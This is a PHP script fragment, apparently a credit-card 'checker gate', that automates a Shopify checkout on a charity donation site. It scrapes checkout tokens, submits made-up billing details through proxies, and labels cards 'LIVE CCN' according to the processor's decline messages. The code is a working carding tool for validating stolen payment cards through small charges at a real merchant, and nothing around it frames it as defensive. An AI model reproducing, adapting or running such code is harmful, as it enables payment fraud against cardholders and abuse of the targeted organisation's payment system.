...
$gate = 'mn';
$gateName = 'shopify + Moneris 15x2 usd';
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.worldvision.ca/cart/44131095113:1?traffic_source=buy_now');
...
$checkouts = trim(strip_tags(getstr($r1, 'https://donate.worldvision.ca/17861839/checkouts/','?')));
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/17861839/checkouts/' . $checkouts . '');
...
$headers[] = 'method: POST';
$headers[] = 'path: /17861839/checkouts/' . $checkouts . '';
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=usa100k%40outlook.com&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=jhin+&checkout%5Bbilling_address%5D%5Blast_name%5D=vera&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=590+W+Flagler+St+Ste+102&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Miami&checkout%5Bbilling_address%5D%5Bprovince%5D=FL&checkout%5Bbilling_address%5D%5Bzip%5D=33130-1667&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Battributes%5D%5Bdate_of_birth%5D=&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=743&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300&checkout%5Battributes%5D%5B10144397001_brand%5D=One+Time+Donation&checkout%5Battributes%5D%5Benvironment%5D=prod&checkout%5Battributes%5D%5BdateOfBirth%5D=null');
$r2 = curl_exec($ch);
curl_close($ch);
...
$total = trim(strip_tags(getstr($r2, 'data-checkout-payment-due-target="', '"')));
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.worldvision.ca/17861839/checkouts/'.$checkouts.'');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.worldvision.ca/17861839/checkouts/'.$checkouts.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
...
if (strpos($r6, 'Declined refer call to issue')) {
    $status = "LIVE CCN ✅";
    $response = $msg;
